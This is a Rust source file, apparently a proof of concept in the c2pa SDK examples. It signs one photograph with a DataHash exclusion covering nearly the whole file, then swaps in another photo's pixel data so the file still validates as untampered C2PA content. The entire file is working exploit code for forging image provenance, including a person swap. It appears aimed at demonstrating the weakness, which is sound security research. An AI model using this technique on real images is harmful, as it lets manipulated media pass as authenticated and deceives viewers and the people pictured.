// Content-swap DataHash exclusion proof-of-concept ("face swap").
//
// This is a *meaningful* variant of `pixel_tamper_exclusion`.  Instead of
// zeroing a random window of the scan data, it takes two photographs of a
// similar scene -- one with a man in it (the "cover"), one with a woman (the
// "insert") -- signs the man's photo while declaring a DataHash exclusion over
// the compressed pixel data, and then splices the woman's pixels into the
// signed file.  The result still validates as a genuine, untampered C2PA
// asset, yet the person in the picture has been swapped out entirely.
//
// Usage:
//   cargo run --release -p c2pa --example face_swap_exclusion -- \
//       <cover.jpg> <insert.jpg> <output_signed.jpg> <output_tampered.jpg>
//
// Example (sign the man, reveal the woman):
//   cargo run --release -p c2pa --example face_swap_exclusion -- \
//       sdk/examples/assets/eiffeltower_male.jpg \
//       sdk/examples/assets/eiffeltower_female.jpg \
//       /tmp/signed_man.jpg /tmp/tampered_woman.jpg

use std::io::{Cursor, Seek, Write};

use anyhow::{anyhow, bail, Result};
use c2pa::{
    crypto::raw_signature::SigningAlg, settings::Settings, Builder, CallbackSigner, Context,
    HashRange, Reader,
};
use serde_json::json;

mod common;
use common::mime_from_path;

const CERTS: &[u8] = include_bytes!("../tests/fixtures/certs/ed25519.pub");
const PRIVATE_KEY: &[u8] = include_bytes!("../tests/fixtures/certs/ed25519.pem");

fn main() -> Result<()> {
    let args: Vec<String> = std::env::args().collect();
    if args.len() != 5 {
        bail!(
            "Usage: face_swap_exclusion <cover.jpg> <insert.jpg> \
             <output_signed.jpg> <output_tampered.jpg>"
        );
    }
    let cover_path = &args[1];
    let insert_path = &args[2];
    let signed_path = &args[3];
    let tampered_path = &args[4];

    let format = mime_from_path(cover_path)?;
    if format != "image/jpeg" || mime_from_path(insert_path)? != "image/jpeg" {
        bail!("only image/jpeg is supported by this PoC");
    }

    let cover_bytes = std::fs::read(cover_path)?;
    let insert_bytes = std::fs::read(insert_path)?;

    let entropy_start_cover = find_entropy_data_start(&cover_bytes)?;
    let entropy_start_insert = find_entropy_data_start(&insert_bytes)?;

    // The insert's scan must decode against the cover's JPEG tables, which is
    // only guaranteed when the two files share byte-identical headers (SOI
    // through the end of the SOS segment).  Enforce that up front.
    if entropy_start_cover != entropy_start_insert
        || cover_bytes[..entropy_start_cover] != insert_bytes[..entropy_start_insert]
    {
        bail!(
            "cover and insert have different JPEG headers (SOI..SOS); the insert's \
             scan would not decode against the cover's tables. Re-export both images \
             with identical encoder settings/dimensions."
        );
    }

    println!(
        "Cover  : {} ({} bytes, scan starts at {}, scan len {})",
        cover_path,
        cover_bytes.len(),
        entropy_start_cover,
        cover_bytes.len() - entropy_start_cover
    );
    println!(
        "Insert : {} ({} bytes, scan starts at {}, scan len {})",
        insert_path,
        insert_bytes.len(),
        entropy_start_insert,
        insert_bytes.len() - entropy_start_insert
    );

    // -- Build signer/context, identical to the sibling PoCs.
    let settings =
        Settings::new().with_toml(include_str!("../tests/fixtures/test_settings.toml"))?;
    let ed_signer =
        |_ctx: *const (), data: &[u8]| CallbackSigner::ed25519_sign(data, PRIVATE_KEY);
    let signer = CallbackSigner::new(ed_signer, SigningAlg::Ed25519, CERTS);
    let context = Context::new()
        .with_settings(settings)?
        .with_signer(signer)
        .into_shared();

    let manifest_def = json!({
        "title": signed_path,
        "format": format,
        "claim_generator_info": [{
            "name": "face_swap_exclusion_poc",
            "version": "0.1.0"
        }],
        "assertions": [{
            "label": "c2pa.actions",
            "data": { "actions": [{"action": "c2pa.created"}] }
        }]
    })
    .to_string();

    let mut builder = Builder::from_shared_context(&context).with_definition(manifest_def)?;

    // -- Placeholder workflow: embed the manifest placeholder at offset 2 (just
    //    after the SOI), shifting the rest of the cover JPEG to the right.
    let placeholder = builder.placeholder("image/jpeg")?;
    let manifest_pos: usize = 2;
    let manifest_len = placeholder.len();

    let mut output: Vec<u8> = Vec::with_capacity(cover_bytes.len() + manifest_len);
    output.extend_from_slice(&cover_bytes[0..manifest_pos]);
    output.extend_from_slice(&placeholder);
    output.extend_from_slice(&cover_bytes[manifest_pos..]);
    let mut output_stream = Cursor::new(output);

    let signed_len = cover_bytes.len() + manifest_len;
    let entropy_start_output = entropy_start_cover + manifest_len;
    let cover_scan_len = signed_len - entropy_start_output;

    // *** ONE exclusion spanning JUMBF through the scan, leaving only the final
    //     2-byte EOI (FFD9) protected. ***  Collapsing everything into a single
    //     range avoids the `additionalExclusionsPresent` informational log; the
    //     price is that the manifest, all JPEG header segments, and the whole
    //     pixel bitstream are now outside the hash.
    let combined_start = manifest_pos;
    let combined_end = signed_len - 2; // exclusive; keep trailing FFD9 hashed
    let combined_len = combined_end - combined_start;
    let combined_excl = HashRange::new(combined_start as u64, combined_len as u64);
    println!("\n=== Signing cover ===");
    println!(
        "  single exclusion : start={}, length={} (JUMBF + JPEG headers + entire \
         {}-byte scan; only SOI/EOI stay hashed)",
        combined_excl.start(),
        combined_excl.length(),
        cover_scan_len,
    );
    builder.set_data_hash_exclusions(vec![combined_excl])?;

    builder.update_hash_from_stream("image/jpeg", &mut output_stream)?;

    let final_manifest = builder.sign_embeddable("image/jpeg")?;
    output_stream.seek(std::io::SeekFrom::Start(manifest_pos as u64))?;
    output_stream.write_all(&final_manifest)?;

    let signed_bytes = output_stream.into_inner();
    std::fs::write(signed_path, &signed_bytes)?;
    println!("  wrote {signed_path} (shows the cover subject)");

    print_validation("Signed cover (untampered)", &signed_bytes)?;

    // -- Swap in the insert's pixels.  Fit the insert scan into the cover's
    //    exact byte budget so every byte outside the exclusion is preserved.
    let insert_scan = &insert_bytes[entropy_start_insert..];
    let mut new_scan = vec![0u8; cover_scan_len];
    let copy_len = insert_scan.len().min(cover_scan_len);
    new_scan[..copy_len].copy_from_slice(&insert_scan[..copy_len]);
    // Force a valid EOI as the final two bytes: this both terminates the JPEG
    // cleanly and makes the only hashed image bytes (FFD9) match the cover.
    let n = new_scan.len();
    new_scan[n - 2] = 0xFF;
    new_scan[n - 1] = 0xD9;

    let mut tampered = signed_bytes[..entropy_start_output].to_vec();
    tampered.extend_from_slice(&new_scan);
    debug_assert_eq!(tampered.len(), signed_bytes.len());

    std::fs::write(tampered_path, &tampered)?;
    println!("\n=== Tampering (content swap) ===");
    let action = if insert_scan.len() > cover_scan_len {
        format!(
            "truncated by {} bytes (bottom rows render gray)",
            insert_scan.len() - cover_scan_len
        )
    } else {
        format!(
            "zero-padded by {} bytes (ignored past EOI)",
            cover_scan_len - insert_scan.len()
        )
    };
    println!(
        "  replaced the cover's {cover_scan_len}-byte scan with the insert's scan, {action}\n  \
         wrote {tampered_path} (shows the insert subject)"
    );

    print_validation("Tampered (pixels swapped)", &tampered)?;

    println!(
        "\nOpen {signed_path} and {tampered_path} side-by-side: the signed file shows \
         the cover subject, the tampered file shows the insert subject, and both pass \
         C2PA validation with a single \"clean-looking\" exclusion."
    );
    Ok(())
}

/// Locate the start of the *main* JPEG entropy-coded scan data.
///
/// Walks JPEG markers from the SOI, skipping each segment by its declared
/// length (so the contents of APPn segments -- including any embedded EXIF
/// thumbnail JPEGs -- are not scanned).  Returns the offset immediately after
/// the SOS segment payload, i.e. the first byte of the main image's compressed
/// pixel bitstream.
fn find_entropy_data_start(bytes: &[u8]) -> Result<usize> {
    if bytes.len() < 4 || bytes[0] != 0xFF || bytes[1] != 0xD8 {
        bail!("not a JPEG (missing SOI)");
    }
    let mut i = 2;
    while i + 1 < bytes.len() {
        if bytes[i] != 0xFF {
            bail!("expected marker at offset {i}, found 0x{:02X}", bytes[i]);
        }
        // Coalesce any fill bytes (FF FF ...).
        let mut j = i + 1;
        while j < bytes.len() && bytes[j] == 0xFF {
            j += 1;
        }
        if j >= bytes.len() {
            bail!("truncated marker at offset {i}");
        }
        let marker = bytes[j];

        // Standalone markers (no length field): SOI(D8), EOI(D9), TEM(01),
        // RSTn (D0..D7).  Just advance past them.
        if marker == 0x01 || matches!(marker, 0xD0..=0xD9) {
            i = j + 1;
            continue;
        }

        if marker == 0xDA {
            // SOS: read segment length and return entropy data start.
            if j + 3 > bytes.len() {
                bail!("truncated SOS segment");
            }
            let seg_len = u16::from_be_bytes([bytes[j + 1], bytes[j + 2]]) as usize;
            return Ok(j + 1 + seg_len);
        }

        // Any other marker carries a 2-byte big-endian length covering the
        // length bytes themselves.  Skip the whole segment.
        if j + 3 > bytes.len() {
            bail!("truncated segment after marker FF{marker:02X}");
        }
        let seg_len = u16::from_be_bytes([bytes[j + 1], bytes[j + 2]]) as usize;
        i = j + 1 + seg_len;
    }
    Err(anyhow!("SOS marker (FF DA) not found in top-level JPEG"))
}

fn print_validation(label: &str, bytes: &[u8]) -> Result<()> {
    let mut cursor = Cursor::new(bytes);
    let reader = Reader::from_stream("image/jpeg", &mut cursor)?;
    let state = reader.validation_state();
    println!("--- Validation: {label} ---");
    println!("  state = {state:?}");
    if let Some(results) = reader.validation_results() {
        if let Some(am) = results.active_manifest() {
            if !am.failure().is_empty() {
                println!("  failure codes:");
                for s in am.failure() {
                    println!("    - {}", s.code());
                }
            }
            if !am.informational().is_empty() {
                println!("  informational codes:");
                for s in am.informational() {
                    println!("    - {}", s.code());
                }
            }
            let datahash_success = am
                .success()
                .iter()
                .any(|s| s.code() == c2pa::validation_status::ASSERTION_DATAHASH_MATCH);
            println!("  ASSERTION_DATAHASH_MATCH present in success codes: {datahash_success}");
        }
    }
    Ok(())
}
